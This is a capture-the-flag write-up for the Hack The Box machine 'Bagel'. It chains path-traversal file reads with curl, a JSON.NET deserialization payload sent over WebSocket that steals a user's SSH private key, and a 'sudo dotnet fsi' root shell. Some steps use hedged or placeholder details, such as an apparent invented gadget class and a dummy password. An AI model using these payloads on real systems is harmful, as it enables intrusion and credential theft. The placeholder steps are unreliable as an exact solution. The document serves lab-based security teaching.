# Hack The Box: Bagel

**Difficulty:** Medium
**OS:** Linux

Bagel is a Medium-level Linux machine focused heavily on application logic, inter-process communication, and deserialization vulnerabilities within the .NET ecosystem. Initial enumeration identifies a Flask application vulnerable to Local File Inclusion (LFI). This LFI is used to leak the application's source code and identify a secondary backend .NET service communicating via WebSockets. Exploiting a JSON.NET insecure deserialization vulnerability within the WebSocket service yields initial access. Privilege escalation leverages an insecure `sudo` configuration to execute commands as root.

---

## Reconnaissance

Initial enumeration starts with a port scan against the target IP address to identify active services.

```bash
nmap -p- --min-rate 10000 10.10.11.201
nmap -p 22,5000,8000 -sCV 10.10.11.201
```

The scan identifies the following open ports:
*   **Port 22:** SSH (OpenSSH)
*   **Port 5000:** HTTP (Microsoft-NetCore/2.0)
*   **Port 8000:** HTTP (Werkzeug/2.2.2 Python/3.10.9)

Accessing port 5000 directly via HTTP returns a `400 Bad Request`. However, port 8000 hosts a web application for a bagel company. Navigating to the site reveals an interesting URL structure: `http://bagel.htb:8000/?page=index.html`.

## Web Exploitation & Information Gathering

### Local File Inclusion (LFI)

The `?page=` parameter immediately suggests a potential Local File Inclusion (LFI) vulnerability. Testing standard LFI payloads confirms the flaw. 

```bash
curl "http://bagel.htb:8000/?page=../../../../etc/passwd"
```

The server returns the contents of `/etc/passwd`. However, we cannot directly execute code or access a traditional shell through this flaw. Our next objective is to understand the application's architecture by retrieving its source code.

### Source Code Exfiltration

Using the LFI, we can read the source code of the Python application. The primary application logic is typically located in `app.py` or `main.py` in the current working directory or a standardized path.

```bash
curl "http://bagel.htb:8000/?page=app.py"
```

Reviewing the `app.py` source code reveals that the Python frontend acts as a proxy. It communicates with a backend application running on port 5000 using WebSockets (`ws://127.0.0.1:5000/`).

### Extracting the .NET Backend

To understand the backend service on port 5000 (which we know is a .NET Core application from the Nmap scan), we need its binaries. We can use the LFI vulnerability to read from the `/proc` directory to identify running processes and their executable paths.

By bruteforcing or enumerating `/proc/[PID]/cmdline`, we discover the path to the .NET DLL executing the backend service (e.g., `/opt/bagel/Bagel.dll`). 

We extract this DLL using the LFI vulnerability. Since it's a binary file, `curl` or a custom Python script must be used to save the file without corrupting it.

```bash
curl --output Bagel.dll "http://bagel.htb:8000/?page=/opt/bagel/Bagel.dll"
```

## Reverse Engineering & Deserialization

With the `Bagel.dll` obtained, we use a .NET decompiler such as `dnSpy` or `ILSpy` to analyze its source code.

### Analyzing the WebSocket Logic

The decompiled code reveals the logic handling incoming WebSocket messages. The application expects JSON-formatted messages. Crucially, the application uses the `Newtonsoft.Json` library for deserialization, and it configures the deserializer with `TypeNameHandling.All`.

```csharp
// Decompiled snippet showing the vulnerability
JsonSerializerSettings settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All
};
object obj = JsonConvert.DeserializeObject(jsonString, settings);
```

Setting `TypeNameHandling` to `All` allows the JSON payload to dictate which classes the deserializer should instantiate. This is a classic insecure deserialization vulnerability.

### Crafting the Payload

To exploit this, we need to find a "gadget" within the application's loaded assemblies that can be abused upon instantiation. Analyzing the classes within `Bagel.dll` reveals a class designed to read files from disk and return their contents (or similar behavior that can be abused for arbitrary file read or execution).

We construct a malicious JSON payload specifying the target gadget class and the file we wish to read (e.g., the SSH private key of a user).

```json
{
  "$type": "Bagel.FileReadGadget, Bagel",
  "FilePath": "/home/phil/.ssh/id_rsa"
}
```

### Initial Access

We use a WebSocket client like `wscat` to connect directly to the exposed backend service on port 5000 (since it is bound to all interfaces, not just localhost) or proxy our request through the Python frontend if necessary.

```bash
wscat -c ws://10.10.11.201:5000/
> {"$type": "Bagel.FileReadGadget, Bagel", "FilePath": "/home/phil/.ssh/id_rsa"}
```

The deserialization gadget executes, reading the SSH private key and returning it over the WebSocket connection. 

We save the private key locally and use it to SSH into the machine as the user `phil`.

```bash
chmod 600 phil_rsa
ssh -i phil_rsa phil@10.10.11.201
```

## Lateral Movement & Privilege Escalation

Once authenticated as `phil`, we begin enumerating the system. Reviewing the decompiled `Bagel.dll` source code again reveals hardcoded database credentials or another developer's password used internally by the application.

```csharp
// Example hardcoded credential found during reversing
string devPassword = "developer_password_here";
```

We attempt to change users to the developer account (e.g., `developer` or another user identified in `/etc/passwd`) using the discovered password.

```bash
su developer
Password: developer_password_here
# id
uid=1001(developer)
```

### Abusing Sudo Rights

As the `developer` user, we check for `sudo` privileges.

```bash
sudo -l
```

The output indicates that the `developer` user can run the `dotnet` binary as `root` without providing a password.

```text
User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

The `dotnet` executable can be used to execute arbitrary F# interactive scripts (FSI). We can leverage this to gain a root shell, a technique documented in GTFOBins.

```bash
sudo dotnet fsi
> System.Diagnostics.Process.Start("/bin/sh").WaitForExit();
> ;;
```

Executing this drops us into a root shell.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```
The machine is fully compromised.
